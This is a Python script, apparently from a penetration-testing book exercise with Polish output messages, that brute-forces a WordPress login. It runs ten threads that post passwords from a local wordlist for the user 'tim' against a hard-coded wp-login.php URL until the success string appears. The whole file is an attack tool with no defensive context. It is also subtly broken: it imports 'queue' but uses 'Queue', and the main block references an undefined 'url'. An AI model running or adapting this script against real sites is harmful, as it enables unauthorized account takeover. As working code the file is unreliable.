from email import parser
from io import BytesIO
from lxml import etree
from queue import queue

import requests
import sys
import threading
import time

SUCCESS = 'Welcome to WordPress'
TARGET = 'http://boodelyboo.com/wordpress/wp-login.php'
WORDLIST = '/home/kali/bhp/bhp/cain.txt'

def get_words():
	with open(WORDLIST) as f:
		raw_words = f.read()

	words = Queue()
	for word in raw_words.split():
		words.put(word)
	return words

def get_params(content):
	params = dict()
	parser = etree.HTMLParser()
	tree = etree.parse(BytesIO(content), parser=parser)
	for elem in tree.findall('//input'): #Wyszukiwanie wszystkich p�l formularza
		name = elem.get('name')
		if name is not None:
			params[name] = elem.get('value', None)
	return params

class Bruter:
	def __init__(self, username, url):
		self.username = username
		self.url = url
		self.found = False
		print(f'\n[*]Atak siłowy na adres {url}.\n')
		print('[*]Zakończona konfiguracja dla nazwy użytkownika =%s\n' % username)

	def run_bruteforce(self, passwords):
		for _ in range(10):
			t = threading.Thread(target=self.web_bruter, args=(passwords,))
			t.start()

	def web_bruter(self, passwords):
		session = requests.Session()
		resp0 = session.get(self.url)
		params = get_params(resp0.content)
		params['log'] = self.username

		while not passwords.empty() and not self.found:
			time.sleep(5)
			passwd = passwords.get()
			print(f'[*]Test nazwy użytkownika i hasła {self.username}/{passwd:<10}')
			params['pwd'] = passwd

			resp1 = session.post(self.url, data=params)
			if SUCCESS in resp1.content.decode():
				self.found = True
				print(f'[+] Atak udany')
				print("[+] Nazwa użytkownika: %s" % self.username)
				print('[+] Hasło: %s\n' % passwd)
				print("[+] Koniec, sprzątanie innych wątków...")

if __name__ == '__main__':
	words = get_words()
	b = Bruter('tim', url)
	b.run_bruteforce((words))